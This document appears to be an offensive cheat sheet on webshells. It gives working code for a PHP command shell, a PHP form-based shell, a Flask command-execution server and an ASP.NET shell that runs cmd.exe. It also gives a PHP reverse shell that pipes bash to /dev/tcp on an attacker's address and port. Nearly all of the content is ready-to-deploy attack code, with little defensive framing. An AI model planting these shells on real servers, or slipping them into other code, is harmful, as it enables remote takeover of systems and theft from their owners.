A **webshell** is a malicious script uploaded to a web server to enable remote command execution. 


## Basic PHP Command Prompt

A simple PHP script can be used to execute system commands via a GET request:

```php
<?php system($_GET['cmd']); ?>
```

This allows to execute commands by passing them in the URL, such as:

```
http://example.com/shell.php?cmd=whoami
```

## PHP Webshell

A more interactive **webshell** can be created using an HTML form to execute commands:

```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

This script provides a simple web interface to execute system commands by entering them into the form field.

## PHP Reverse Shell
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<own_ip>/<port> 0>&1'"); ?>
```

## Python Webshell

```python
import os
from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def shell():
    cmd = request.args.get('cmd')
    if cmd:
        return os.popen(cmd).read()
    return 'Send a command using ?cmd=your_command'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

This Python webshell uses Flask to run system commands via HTTP requests.

## ASP Webshell

```
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request["cmd"];
        if (!string.IsNullOrEmpty(cmd))
        {
            Process proc = new Process();
            proc.StartInfo.FileName = "cmd.exe";
            proc.StartInfo.Arguments = "/c " + cmd;
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();
            Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
        }
    }
</script>
```

This ASP webshell executes system commands using `cmd.exe` and displays the output.